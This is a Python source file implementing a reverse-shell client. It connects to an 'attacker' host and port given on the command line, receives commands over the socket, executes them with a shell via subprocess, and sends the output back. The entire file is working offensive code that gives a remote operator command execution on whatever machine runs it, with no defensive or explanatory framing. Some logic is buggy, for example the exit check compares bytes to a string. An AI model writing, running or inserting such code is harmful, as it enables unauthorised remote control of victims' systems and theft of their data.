import socket
import subprocess
import sys
import os

def client_sock(ip_addr, port):
    # create the socket object
    s = socket.socket()
   # connect to the server
    s.connect((ip_addr, port))
    # receive the greeting message
    message = s.recv(1024).decode()
    print("Server:", message)

    while True:
        # receive the command from the server

        command = s.recv(1024)
        if command[:2].decode() == 'cd':
            os.chdir(command[3:].decode('utf-8'))
        if len(command) > 0:
            # We need to make our own little package to do this (better) lol
            cmd = subprocess.Popen(command[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
            #command = s.recv(1024).decode()
        if command.lower() == "exit":
            s.close()

        #if command[:2] == 'cd':
        #    os.chdir(command[3:])
            # if the command is exit, just break out of the loop
        # execute the command and retrieve the results
   
        # Needs to be our package of commands instead of subprocess
        #output = subprocess.getoutput(command)
        # send the results back to the server
        #s.send(output.encode())
   
    # Check if the connection is still alive passively, if not alive then quit
# close client connection
    s.close()
    return command

def main():
    try:
        attacker = sys.argv[1]
        port = int(sys.argv[2])
    except KeyboardInterrupt:
        sys.exit("\nExiting...")
    result = client_sock(attacker, port)
    print(result)

main()
